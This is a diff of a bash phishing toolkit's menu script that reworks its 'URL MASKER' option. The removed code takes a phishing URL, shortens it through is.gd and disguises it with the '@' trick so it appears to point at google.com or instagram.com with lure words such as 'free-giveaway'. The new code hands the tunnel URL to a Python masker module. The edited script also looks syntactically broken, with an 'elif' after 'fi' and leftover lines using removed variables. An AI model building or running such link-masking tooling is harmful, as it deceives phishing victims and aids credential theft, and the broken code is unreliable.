@@ -146,23 +146,23 @@ if [[ $option == "4" ]]; then
     exec ./techyfatcat.sh
 fi
 
-if [[ $option == "5" ]]; then
-    echo -e "\n${C}━━━━━━━━━━━━━ URL MASKER ━━━━━━━━━━━━━${NC}"
-    read -p "  Enter Phishing/Original URL (e.g. http://ngrok...): " phish_url
-    read -p "  Enter Masking Domain (e.g. google.com, instagram.com): " mask_dom
-    read -p "  Enter Social Keywords (e.g. free-giveaway, login): " keywords
-
-    echo -e "\n${Y}[*] Shortening and masking...${NC}"
+elif [[ $option == "5" ]]; then
+    clear
+    echo -e "${B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "  ${C}URL MASKING MODULE${NC}"
+    echo -e "${B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
     
-    # Use is.gd or da.gd for shortening (reliable & no API key needed)
-    short_url=$(curl -s "https://is.gd/create.php?format=simple&url=$phish_url")
-    
-    if [[ $short_url == *"err"* || -z "$short_url" ]]; then
-        echo -e "${R}[!] Error: Invalid URL or API down.${NC}"
-        sleep 2
-        exec ./techyfatcat.sh
+    # Use the current tunnel URL if it exists, else ask
+    if [ -z "$FINAL_URL" ]; then
+        read -p "  Enter Original URL: " FINAL_URL
     fi
-
+    
+    # Call the python script
+    python3 modules/masker.py "$FINAL_URL"
+    
+    read -p "  Press Enter to return to main menu..."
+    exec ./techyfatcat.sh
+fi
     # The magic: creating the masked link
     # Format: https://mask-domain-keywords@short-url
     masked_url="https://$mask_dom-$keywords@${short_url#https://}"
